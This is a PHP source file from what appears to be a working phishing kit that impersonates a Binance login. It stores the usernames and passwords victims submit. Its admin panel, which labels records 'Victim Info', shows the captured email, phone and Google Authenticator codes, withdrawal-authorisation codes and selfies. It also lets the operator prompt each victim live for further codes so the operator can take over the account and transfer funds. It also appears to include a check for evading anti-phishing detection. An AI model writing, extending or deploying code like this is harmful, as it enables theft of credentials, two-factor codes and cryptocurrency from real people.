<?php


include '../../CONFIG.php';
include 'margin.php';
include '../vendor/100.php';
include '../vendor/200.php';
include '../vendor/300.php';
include '../vendor/index.php';
include '../vendor/netcraft_check.php';
// require '../vendor/crypt.php';

session_start();

function numeric($num)
{
	if (preg_match('/^[0-9]+$/', $num)) {
		$status = true;
	} else {
		$status = false;
	}
	return $status;
}

///STEP ONE FORM HANDLER ->
if ($_GET['type'] == 'login') {
	if($_POST['usrlogin'] and $_POST['usrpass'] and $_POST['ip'] and $_POST['ua']) {
		$usrlogin = $_POST['usrlogin'];
		$usrpass = $_POST['usrpass'];
		$ip = $_POST['ip'];
		$comment = "User just logged into account";
		$ua = urlencode($_POST['ua']);
		$uniqueid = time();

		if ($_SESSION['started'] == 'true') {
			$uniqueid = $_SESSION['uniqueid'];
			$query = mysqli_query($conn, "UPDATE customers SET status=1, buzzed=0, usrlogin='$usrlogin', usrpass='$usrpass', comment='{$comment}', useragent='$ua', ip='$ip' WHERE uniqueid=$uniqueid");
			if ($query) {
				echo json_encode(array(
					'status' => 'ok'
				));
			} else {
				echo json_encode(array(
					'status' => 'db conn notok'
				));
			}
		} else {
			$_SESSION['uniqueid'] = $uniqueid;
			$_SESSION['started'] = 'true';
			$query = mysqli_query($conn, "INSERT INTO customers (usrlogin, usrpass, comment, ip, useragent, uniqueid, status) VALUES ('{$usrlogin}', '{$usrpass}', '{$comment}', '{$ip}', '{$ua}',{$uniqueid}, 1)");
			if ($query) {
				echo json_encode(array(
					'status' => 'ok'
				));
			} else {
				echo json_encode(array(
					'status' => 'db conn notok'
				));
			}
		}
	}
}

//ADMIN & DATA FORM HANDLER ->
if ($_SESSION['admin_logged'] == 'true') {
	if($_GET['type'] == 'commmand'){
		if($_POST['userid'] and numeric($_POST['userid']) == true and $_POST['status'] and numeric($_POST['status']) == true){
			$userid = $_POST['userid']; // the normal id not unique one
			$status = $_POST['status'];
			$phonenum = $_POST['phonenum'];
			$authy = $_POST['authy'];
			$usrmail = $_POST['usrmail'];
			$secphonenum = $_POST['secphonenum'];
			$secauthy = $_POST['secauthy'];
			$secusrmail = $_POST['secusrmail'];
			$comment = "Admin has sent command";


			//all three login
			if($phonenum != null and $phonenum != '' and $authy == 1 and $authy == 1 and $usrmail != null and $usrmail != ''){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, phonenum='{$phonenum}', authy='{$authy}', usrmail='{$usrmail}' WHERE id={$userid}");

				//all three withdrawal security
			}else if($secphonenum != null and $secphonenum != '' and $secauthy == 1 and $secauthy == 1 and $secusrmail != null and $secusrmail != ''){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secphonenum='{$secphonenum}', secauthy='{$secauthy}', secusrmail='{$secusrmail}' WHERE id={$userid}");

				//phone and mail login
			}else if($phonenum != null and $phonenum != '' and $usrmail != null and $usrmail != '' and $authy != 1 and $authy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, phonenum='{$phonenum}', usrmail='{$usrmail}' WHERE id={$userid}");

				//mail and authy login
			}else if($phonenum == null and $phonenum == '' and $usrmail != null and $usrmail != '' and $authy == 1 and $authy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, phonenum='', authy='{$authy}', usrmail='{$usrmail}' WHERE id={$userid}");

				//phone and authy login
			}else if($phonenum != null and $phonenum != '' and $usrmail == null and $usrmail == '' and $authy == 1 and $authy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, usrmail='', phonenum='{$phonenum}', authy='{$authy}' WHERE id={$userid}");

				//phone only login
			}else if($phonenum != null and $phonenum != '' and $usrmail == null and $usrmail == '' and $authy != 1 and $authy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, usrmail='', phonenum='{$phonenum}' WHERE id={$userid}");

				//mail only login
			}else if($phonenum == null and $phonenum == '' and $usrmail != null and $usrmail != '' and $authy != 1 and $authy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, phonenum='', usrmail='{$usrmail}' WHERE id={$userid}");

				//authy only login
			}else if($phonenum == null and $phonenum == '' and $usrmail == null and $usrmail == '' and $authy == 1 and $authy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, usrmail='', phonenum='', authy='{$authy}' WHERE id={$userid}");

			}else if($secphonenum != null and $secphonenum != '' and $secusrmail != null and $secusrmail != '' and $secauthy != 1 and $secauthy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secphonenum='{$secphonenum}', secusrmail='{$secusrmail}' WHERE id={$userid}");

				//secmail and secauthy login
			}else if($secphonenum == null and $secphonenum == '' and $secusrmail != null and $secusrmail != '' and $secauthy == 1 and $secauthy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secphonenum='', secauthy='{$secauthy}', secusrmail='{$secusrmail}' WHERE id={$userid}");

				//secphone and secauthy login
			}else if($secphonenum != null and $secphonenum != '' and $secusrmail == null and $secusrmail == '' and $secauthy == 1 and $secauthy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secusrmail='', secphonenum='{$secphonenum}', secauthy='{$secauthy}' WHERE id={$userid}");

				//secphone only
			}else if($secphonenum != null and $secphonenum != '' and $secusrmail == null and $secusrmail == '' and $secauthy != 1 and $secauthy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secusrmail='', secphonenum='{$secphonenum}' WHERE id={$userid}");

				//secmail only
			}else if($secphonenum == null and $secphonenum == '' and $secusrmail != null and $secusrmail != '' and $secauthy != 1 and $secauthy != 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secphonenum='', secusrmail='{$secusrmail}' WHERE id={$userid}");

				//secauthy only
			}else if($secphonenum == null and $secphonenum == '' and $secusrmail == null and $secusrmail == '' and $secauthy == 1 and $secauthy == 1){
				$query = mysqli_query($conn, "UPDATE customers SET comment='{$comment}', status={$status}, secusrmail='', secphonenum='', secauthy='{$secauthy}' WHERE id={$userid}");

				//empty
			}else{
				$query = mysqli_query($conn, "UPDATE customers SET status={$status} WHERE id={$userid}");
			}

			if($query){

				echo json_encode(array(
				'status' => 'ok'
				));
			}else{
				echo json_encode(array(
				'status' => 'db conn notok'
				));
			}
		}else{
		echo json_encode(array(
			'status' => 'command notokk'
		));
		}
	}

	// NEW DATA HANDLER
	if (isset($_GET['get_submitted'])) {
		$query = mysqli_query($conn, "SELECT * FROM customers WHERE status<=7 and buzzed=0");
		if ($query) {
			$num = mysqli_num_rows($query);
			$array = mysqli_fetch_array($query, MYSQLI_ASSOC);
			if ($num >= 1) {

				echo json_encode(array(
					'status' => 'ok'
				));
			} else {
				echo json_encode(array(
					'status' => 'notok'
				));
			}
		} else {
			echo json_encode(array(
				'status' => 'notok'
			));
		}
	}
	
	// FETCHING MOBILE TABLE DATA
	if (isset($_GET['fetch_data'])) {

		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
				//print_r($array);
			}
		}

		foreach ($array as $value) {
			if($value['status'] == 500){
				$info = '<span class="badge badge-warning">Easter egg</span>';
			}elseif($value['status'] == 1){
				$info = '<span class="badge badge-info">New User</span>';
			}elseif($value['status'] == 2){
				$info = '<span class="badge badge-primary">Submitted Auth code(s)</span>';
			}elseif($value['status'] == 3){
				$info = '<span class="badge badge-primary">Submitted Security code(s)</span>';
			}elseif($value['status'] == 4){
				$info = '<span class="badge badge-primary">Uploaded Selfie</span>';
			}elseif($value['status'] == 11){
				$info = '<span class="badge badge-primary">Awaiting App Auth</span>';
			}elseif($value['status'] == 12){
				$info = '<span class="badge badge-primary">Awaiting Withrawal Auth</span>';
			}elseif($value['status'] == 13){
				$info = '<span class="badge badge-primary">Awaiting Selfie</span>';
			}elseif($value['status'] == 50){
				$info = '<span class="badge badge-primary">Back to Login</span>';
			}elseif($value['status'] == 100){
				$info = '<span class="badge badge-info">INVALID</span>';
			}elseif($value['status'] == 20){
				$info = '<span class="badge badge-success">Finished</span>';
			}
			if ($value['status'] == 20) {
				$userStatus = '<span><img src="partial/img/off.png" style="width:20px;padding-right:1px"><b>Offline</b></span>';
				echo "
				<tr style='color:white'>
					<td>{$value['id']}</td>
					<td>{$value['usrlogin']}</td>
					<td>$userStatus</td>
					<td>{$value['ip']}</td>
					<td>$info</td>
					<td>
						<button type='button' onclick='view_logBtn(this)' class='btn btn-md btn-dark' id='userid_{$value['id']}' data-toggle='modal' data-target='#viewmodal_userid_{$value['id']}'>View Log</button>
						<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
					</td>
				</tr>
				";
			} else {
				$userStatus = '<span><img src="partial/img/off.png" style="width:20px;padding-right:1px"><b>Offline</b></span>';
				$savedStatus = $value['last_activity'];
				if ($savedStatus !== null) {
					$user_main_status = new DateTime($savedStatus);
					$currentTime = new DateTime("now");
					//time difference
					$indicator = $currentTime->getTimestamp() - $user_main_status->getTimestamp();

					if ($indicator <= 8) {
						$userStatus = '<span><img src="partial/img/on.png" style="width:20px;padding-right:1px"><b>Online</b></span>';
					} //end

				} else if ($savedStatus === null) {
					$userStatus = '<span><img src="partial/img/na.png" style="width:25px;padding-right:1px"><b>No data</b></span>';
				}
				echo "
				<tr style='color:white'>
					<td>{$value['id']}</td>
					<td>{$value['usrlogin']}</td>
					<td>$userStatus</td>
					<td>$info<br>{$value['comment']}</td>
					<td>
						<button type='button' onclick='controlBtn(this)' class='btn btn-md btn-info' id='userid_{$value['id']}' data-toggle='modal' data-target='#modal_userid_{$value['id']}'>Action</button>
						<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
					</td>
				</tr>
				";
			}
		}
	}
	
	// FETCHING PC TABLE DATA
	if (isset($_GET['fetch_pc_data'])) {

		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = array_filter(mysqli_fetch_all($query, MYSQLI_ASSOC));
				//print_r($array);
			}
		}

		foreach ($array as $value) {
			if($value['status'] == 500){
				$info = '<span class="badge badge-warning">Easter egg</span>';
			}elseif($value['status'] == 1){
				$info = '<span class="badge badge-info">New User</span>';
			}elseif($value['status'] == 2){
				$info = '<span class="badge badge-primary">Submitted Auth code(s)</span>';
			}elseif($value['status'] == 3){
				$info = '<span class="badge badge-primary">Submitted Security code(s)</span>';
			}elseif($value['status'] == 4){
				$info = '<span class="badge badge-primary">Uploaded Selfie</span>';
			}elseif($value['status'] == 11){
				$info = '<span class="badge badge-primary">Awaiting App Auth</span>';
			}elseif($value['status'] == 12){
				$info = '<span class="badge badge-primary">Awaiting Withrawal Auth</span>';
			}elseif($value['status'] == 13){
				$info = '<span class="badge badge-primary">Awaiting Selfie</span>';
			}elseif($value['status'] == 50){
				$info = '<span class="badge badge-primary">Back to Login</span>';
			}elseif($value['status'] == 100){
				$info = '<span class="badge badge-info">INVALID</span>';
			}elseif($value['status'] == 20){
				$info = '<span class="badge badge-success">Finished</span>';
			}
			if ($value['status'] == 20) {
				$userStatus = '<span><img src="partial/img/off.png" style="width:20px;padding-right:1px"><b>Offline</b></span>';
				echo "
				<tr style='color:white'>
					<td>{$value['id']}</td>
					<td>{$value['usrlogin']}</td>
					<td>$userStatus</td>
					<td>{$value['ip']}</td>
					<td>$info</td>
					<td>
						<button type='button' onclick='view_logBtn(this)' class='btn btn-md btn-dark' id='userid_{$value['id']}' data-toggle='modal' data-target='#viewmodal_userid_{$value['id']}'>View Log</button>
						<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
					</td>
				</tr>
				";
			} else {
				$userStatus = '<span><img src="partial/img/off.png" style="width:20px;padding-right:1px"><b>Offline</b></span>';
				$savedStatus = $value['last_activity'];
				if ($savedStatus !== null) {
					$user_main_status = new DateTime($savedStatus);
					$currentTime = new DateTime("now");
					//time difference
					$indicator = $currentTime->getTimestamp() - $user_main_status->getTimestamp();

					if ($indicator <= 8) {
						$userStatus = '<span><img src="partial/img/on.png" style="width:20px;padding-right:1px"><b>Online</b></span>';
					} //end

				} else if ($savedStatus === null) {
					$userStatus = '<span><img src="partial/img/na.png" style="width:25px;padding-right:1px"><b>No data</b></span>';
				}
				echo "
				<tr style='color:white'>
					<td>{$value['id']}</td>
					<td>{$value['usrlogin']}</td>
					<td>$userStatus</td>
					<td>{$value['ip']}</td>
					<td>{$value['comment']}</td>
					<td>$info</td>
					<td>
						<button type='button' onclick='controlBtn(this)' class='btn btn-md btn-info' id='userid_{$value['id']}' data-toggle='modal' data-target='#modal_userid_{$value['id']}'>Action</button>
						<button type='button' class='btn btn-md btn-danger' id='userid_{$value['id']}'onclick='deleteentry(this)'><i class='fa fa-trash' aria-hidden='true'></i></button>
					</td>
				</tr>
				";
			}
		}
	}
	
	// FETCHING PC MODAL DATA
	if (isset($_GET['fetch_pc_modal_data'])) {
		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = mysqli_fetch_all($query, MYSQLI_ASSOC);
				//print_r($array);
			}
		}
		foreach ($array as $value) {
			$usrlogin  = $value['usrlogin'];
			$usrpass  = $value['usrpass'];
			$phonenum = $value['phonenum'];
			$secphonenum = $value['secphonenum'];
			$authy  = $value['authy'];
			$secauthy  = $value['secauthy'];
			$usrmail  = $value['usrmail'];
			$secusrmail  = $value['secusrmail'];
			$mailcode  = $value['mailcode'];
			$phonecode  = $value['phonecode'];
			$authcode  = $value['authcode'];
			$secauthcode  = $value['secauthcode'];
			$secmailcode  = $value['secmailcode'];
			$secphonecode  = $value['secphonecode'];
			$filepath = $value['filepath'];
			$ip = $value['ip'];
			$useragent = urldecode($value['useragent']);
			
			$data_log = "
			====> LOGIN PAGE <====
			Binance Login : $usrlogin
			Password : $usrpass
			=====> Device Auth <=====
			Mail Code ($usrmail) : $mailcode
			Phone Code ($phonenum) : $phonecode
			Google Auth Code : $authcode
			=====> Withdrawal Auth <=====
			Security Mail Code ($secusrmail) : $secmailcode
			Security Phone Code ($secphonenum) : $secphonecode
			Google Auth Code : $secauthcode
			===============================
			IP : $ip
			UA : $useragent
			===============================";
			
			echo "
	
			<div class='modal fade' id='modal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' style='opacity:1 !important;display:none' aria-hidden='true'>
				<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
					<input type='hidden' name='userid' value='{$value['id']}'>
					<div class='modal-dialog' role='document' style='width:500px'>
						<div class='modal-content' style='background-color: black;'>
							<div class='modal-header' style='background-color:#34495E;font-size:2.7rem;text-align:center;'>
								<h5 class='modal-title' id='exampleModalLabel' style='color:white'>Admin Control</h5>
								<button type='button' class='close' onclick='close_btn()' aria-label='Close'>
									<span aria-hidden='true' style='color:white'>&times;</span>
								</button>
							</div>
							<div class='modal-body'>
								<div class='form-group' style='margin-bottom:1rem'>
									<br>
									<textarea id='textareaoptions' class='form-control' disabled='disabled' rows='16' style='height:300px;'>$data_log</textarea>
									<br>
									<center><img src='$filepath' width='100px' alt='no image to display'></center>
								</div>
									
								<table style='width: 100%;background-color: black;color: white;padding: 10%;'>
									<tbody style='line-height:100%;'>
										<tr>
											<td>
												<div class='form-check'>
													<label for='askcharsradio{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' value='11' id='askcharsradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Request Device Auth</span>
													</label>
												</div>
												<!-- Input characters -->
												<div class='form-group' style='display:none;' id='askchars{$value['id']}'>
													<div class='row' style='margin-left:5%;margin-top:5px' >
														<div class='col'>
															<input type='text' class='form-control' name='usrmail' id='usrmail' placeholder='Copy mail here e.g qw**@ab.com, leave empty if N/A'>
														</div>
													</div>
													<div class='row' style='font-weight:700;margin-left:5%;margin-top:5px'>User Phone
														<div class='col'>
															<input type='text' class='form-control' name='phonenum' id='phonenum' placeholder='Copy phone here e.g 07***23, leave empty if N/A'>
														</div>
													</div>
													<div class='row' style='margin-left:5%;margin-top:5px'>
														<div class='col'>
															<select class='form-control' name='authy' id='authy'>
																<option value='1'> Google Auth - Yes </option>
																<option value='0' selected> Google Auth - No </option>
															</select>
														</div>
													</div>
												</div>
											</td>
						
											<td>
												<div class='form-check'>
													<label for='askcharsradio{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' value='12' id='askcharsradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Request Transfer Auth</span>
													</label>
												</div>
												<!-- Input characters -->
												<div class='form-group' style='display:none;' id='askchars{$value['id']}'>
													<div class='row' style='margin-left:5%;margin-top:5px' >
														<div class='col'>
															<input type='text' class='form-control' name='secusrmail' id='secusrmail' placeholder='Copy mail here e.g qw**@ab.com, leave empty if N/A'>
														</div>
													</div>
													<div class='row' style='font-weight:700;margin-left:5%;margin-top:5px'>User Phone
														<div class='col'>
															<input type='text' class='form-control' name='secphonenum' id='secphonenum' placeholder='Copy phone here e.g 07***23, leave empty if N/A'>
														</div>
													</div>
													<div class='row' style='margin-left:5%;margin-top:5px'>
														<div class='col'>
															<select class='form-control' name='secauthy' id='secauthy'>
																<option value='1'> Google Auth - Yes </option>
																<option value='0' selected> Google Auth - No </option>
															</select>
														</div>
													</div>
												</div>
											</td>
										</tr>
											
										<tr>
											<td>
												<div class='form-check'>
													<label for='askotpcode{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' value='13' id='askotpcode{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Request Picture</span>
													</label>
												</div>
											</td>
											<td>
												<div class='form-check'>
													<label for='askloginradio{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' checked value='50' id='askloginradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Request login again </span>
													</label>
												</div>
											</td>
										</tr>
										
										<tr>
											<td>
												<div class='form-check'>
													<label for='sendawayradio{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' value='100' id='sendawayradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Invalid, Send away</span>
													</label>
												</div>
											</td>
											<td>
												<div class='form-check'>
													<label for='finishradio{$value['id']}' class='form-check-label'>
														<input type='radio' name='status' value='20' id='finishradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
														<span>Finish</span>
													</label>
												</div>
											</td>
										</tr>
										
									</tbody>
								</table>
							</div>
							<!-- End commands edit -->

							<div class='modal-footer' style='margin-top:-40px'>
								<button type='button' onclick='close_btn()' class='btn btn-secondary' data-dismiss='modal'>Close</button>
								<button id='save_{$value['id']}' onclick='form_submit(this)' type='button' class='btn btn-primary'>Save</button>
							</div>
						</div>
					</div>
				</form>
			</div>
			";
		}
	}
	
	// FETCHING PC FINISH MODAL DATA
	if (isset($_GET['fetch_pc_finish_modal_data'])) {
		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = mysqli_fetch_all($query, MYSQLI_ASSOC);
				//print_r($array);
			}
		}
		foreach ($array as $value) {
			$usrlogin  = $value['usrlogin'];
			$usrpass  = $value['usrpass'];
			$phonenum = $value['phonenum'];
			$secphonenum = $value['secphonenum'];
			$authy  = $value['authy'];
			$secauthy  = $value['secauthy'];
			$usrmail  = $value['usrmail'];
			$secusrmail  = $value['secusrmail'];
			$mailcode  = $value['mailcode'];
			$phonecode  = $value['phonecode'];
			$authcode  = $value['authcode'];
			$secauthcode  = $value['secauthcode'];
			$secmailcode  = $value['secmailcode'];
			$secphonecode  = $value['secphonecode'];
			$filepath = $value['filepath'];
			$ip = $value['ip'];
			$useragent = urldecode($value['useragent']);
			
			$data_log = "
			====> LOGIN PAGE <====
			Binance Login : $usrlogin
			Password : $usrpass
			=====> Device Auth <=====
			Mail Code ($usrmail) : $mailcode
			Phone Code ($phonenum) : $phonecode
			Google Auth Code : $authcode
			=====> Withdrawal Auth <=====
			Security Mail Code ($secusrmail) : $secmailcode
			Security Phone Code ($secphonenum) : $secphonecode
			Google Auth Code : $secauthcode
			===============================
			IP : $ip
			UA : $useragent
			===============================";

			echo "
			
			<div class='modal fade' id='viewmodal_userid_{$value['id']}' tabindex='-1' role='dialog' aria-labelledby='exampleModalLabel' style='opacity:1 !important;display:none' aria-hidden='true'>
			
				<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
					<input type='hidden' name='userid' value='{$value['id']}'>
					<div class='modal-dialog' role='document' style='width:500px'>
						<div class='modal-content'>
							<div class='modal-header' style='background-color:#34495E;font-size:2.7rem;text-align:center;'>
								<h5 class='modal-title' id='exampleModalLabel' style='color:white'>Victim Info</h5>
								<button type='button' class='close' data-dismiss='modal' aria-label='Close'>
									<span aria-hidden='true' style='color:white'>&times;</span>
								</button>
							</div>
							<div class='modal-body'>
								<div class='form-group'>
									<br>
									<textarea id='textareafinish' class='form-control' disabled='disabled' rows='12'>$data_log</textarea>
									<br>
									<center><img src='$filepath' width='100px' alt='no image to display'></center>
								</div>
							</div>
							<div class='modal-footer' style='margin-top:-40px'>
								<button type='button' class='btn btn-lg btn-dark col-12' onclick='close_btn()'>CLOSE</button>
							</div>
						</div>
					</div>
				</form>
			</div>
			";
		}
	}
	
	// FETCHING MOBILE MODAL DATA
	if (isset($_GET['fetch_modal_data'])) {
		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = mysqli_fetch_all($query, MYSQLI_ASSOC);
				//print_r($array);
			}
		}
		foreach ($array as $value) {
			$usrlogin  = $value['usrlogin'];
			$usrpass  = $value['usrpass'];
			$phonenum = $value['phonenum'];
			$secphonenum = $value['secphonenum'];
			$authy  = $value['authy'];
			$secauthy  = $value['secauthy'];
			$usrmail  = $value['usrmail'];
			$secusrmail  = $value['secusrmail'];
			$mailcode  = $value['mailcode'];
			$phonecode  = $value['phonecode'];
			$authcode  = $value['authcode'];
			$secauthcode  = $value['secauthcode'];
			$secmailcode  = $value['secmailcode'];
			$secphonecode  = $value['secphonecode'];
			$filepath = $value['filepath'];
			$ip = $value['ip'];
			$useragent = urldecode($value['useragent']);

			echo "
	
			<div class='modal fade' id='modal_userid_{$value['id']}' tabindex='-1' role='dialog' style='opacity:1 !important;display:none' aria-labelledby='exampleModalLabel' aria-hidden='true'>
			
				<form name='config_form_{$value['id']}' id='config_form_{$value['id']}' method='POST' action='' novalidate>
				<input type='hidden' name='userid' value='{$value['id']}'>
				<div class='modal-dialog' role='document' style='margin-top:20%;max-width:100%;font-size:1.2rem;'>
				<div class='modal-content' style='background-color: black;'>
					<div class='modal-header' style='background-color:#34495E;font-size:2.7rem;text-align:center;'>
					<h5 class='modal-title' id='exampleModalLabel' style='color:white;font-size:1.2rem'>Admin Control (click on log to auto-copy)</h5>
					<button type='button' class='close' onclick='close_btn()'  aria-label='Close'>
						<span aria-hidden='true' style='color:white'>&times;</span>
					</button>
					</div>
					<div class='modal-body'>
					
					<!-- START CONTENT -->
				
					<div class='form-group' style='margin-bottom:1rem'>
						<br>
						<center><img src='$filepath' style='width:70px;border-radius:10px' alt='no image to display'></center>
						<br>

						<div class='data-group'>
							<label class='data-label'>User login</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$usrlogin'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Password</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$usrpass'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Mail Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$mailcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Phone Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$phonecode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Google Code</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$authcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Mail Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secmailcode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Phone Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secphonecode'>
						</div>
						<div class='data-group'>
							<label class='data-label'>Google Code**</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$secauthcode'>
						</div>
						<!--
						<div class='data-group'>
							<label class='data-label'>Exp / CVV</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$expiry [$cvvnum]'>
						</div>
						-->
						<div class='data-group'>
							<label class='data-label'>IP/Device</label>
							<input onclick='copy_btn(this)' class='form-control' readonly value='$ip [$useragent]'>
						</div>
						<br>
					</div>
					
					<!-- END -->
					
					<table style='width: 100%;background-color: black;color: white;padding: 10%;'>
						<tbody style='line-height:100%;'>
							<tr>
								<td>
									<div class='form-check'>
										<label for='askcharsradio{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' value='11' id='askcharsradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Request Device Auth</span>
										</label>
									</div>
									<!-- Input characters -->
									<div class='form-group' style='display:none;' id='askchars{$value['id']}'>
										<div class='row' style='margin-left:5%;margin-top:5px' >
											<div class='col'>
												<input type='text' class='form-control' name='usrmail' id='usrmail' placeholder='Copy mail here e.g qw**@ab.com, leave empty if N/A'>
											</div>
										</div>
										<div class='row' style='font-weight:700;margin-left:5%;margin-top:5px'>User Phone
											<div class='col'>
												<input type='text' class='form-control' name='phonenum' id='phonenum' placeholder='Copy phone here e.g 07***23, leave empty if N/A'>
											</div>
										</div>
										<div class='row' style='margin-left:5%;margin-top:5px'>
											<div class='col'>
												<select class='form-control' name='authy' id='authy'>
													<option value='1'> Google Auth - Yes </option>
													<option value='0' selected> Google Auth - No </option>
												</select>
											</div>
										</div>
									</div>
								</td>
			
								<td>
									<div class='form-check'>
										<label for='askcharsradio{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' value='12' id='askcharsradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Request Transfer Auth</span>
										</label>
									</div>
									<!-- Input characters -->
									<div class='form-group' style='display:none;' id='askchars{$value['id']}'>
										<div class='row' style='margin-left:5%;margin-top:5px' >
											<div class='col'>
												<input type='text' class='form-control' name='secusrmail' id='secusrmail' placeholder='Copy mail here e.g qw**@ab.com, leave empty if N/A'>
											</div>
										</div>
										<div class='row' style='font-weight:700;margin-left:5%;margin-top:5px'>User Phone
											<div class='col'>
												<input type='text' class='form-control' name='secphonenum' id='secphonenum' placeholder='Copy phone here e.g 07***23, leave empty if N/A'>
											</div>
										</div>
										<div class='row' style='margin-left:5%;margin-top:5px'>
											<div class='col'>
												<select class='form-control' name='secauthy' id='secauthy'>
													<option value='1'> Google Auth - Yes </option>
													<option value='0' selected> Google Auth - No </option>
												</select>
											</div>
										</div>
									</div>
								</td>
							</tr>
								
							<tr>
								<td>
									<div class='form-check'>
										<label for='askotpcode{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' value='13' id='askotpcode{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Request Picture</span>
										</label>
									</div>
								</td>
								<td>
									<div class='form-check'>
										<label for='askloginradio{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' checked value='50' id='askloginradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Request login again </span>
										</label>
									</div>
								</td>
							</tr>
							
							<tr>
								<td>
									<div class='form-check'>
										<label for='sendawayradio{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' value='100' id='sendawayradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Invalid, Send away</span>
										</label>
									</div>
								</td>
								<td>
									<div class='form-check'>
										<label for='finishradio{$value['id']}' class='form-check-label'>
											<input type='radio' name='status' value='20' id='finishradio{$value['id']}' onclick='showfields({$value['id']});' class='status form-check-input'>
											<span>Finish</span>
										</label>
									</div>
								</td>
							</tr>
						</tbody>
					</table>
			
				
			
				
			
			</div>
			<!-- End commands edit -->
			
			<div class='modal-footer' style='margin-top:-40px'>
				<button type='button' class='btn btn-secondary' onclick='close_btn()' >Close</button>
				<button id='save_{$value['id']}' onclick='form_submit(this)' type='button' class='btn btn-primary'>Save</button>
			</div>
			</div>
			</div>
			</form>
			</div>
			";
		}
	}
	
	// FETCHING MOBILE FINISH MODAL DATA
	if (isset($_GET['fetch_finish_modal_data'])) {
		$query = mysqli_query($conn, "SELECT * from customers");
		if ($query) {
			if (mysqli_num_rows($query) >= 1) {
				$array = mysqli_fetch_all($query, MYSQLI_ASSOC);
				//print_r($array);
			}
		}
		foreach ($array as $value) {
			$usrlogin  = $value['usrlogin'];
			$usrpass  = $value['usrpass'];
			$phonenum = $value['phonenum'];
			$secphonenum = $value['secphonenum'];
			$authy  = $value['authy'];
			$secauthy  = $value['secauthy'];
			$usrmail  = $value['usrmail'];
			$secusrmail  = $value['secusrmail'];
			$mailcode  = $value['mailcode'];
			$phonecode  = $value['phonecode'];
			$authcode  = $value['authcode'];
			$secauthcode  = $value['secauthcode'];
			$secmailcode  = $value['secmailcode'];
			$secphonecode  = $value['secphonecode'];
			$filepath = $value['filepath'];
			$ip = $value['ip'];
			$useragent = urldecode($value['useragent']);

			echo "
	
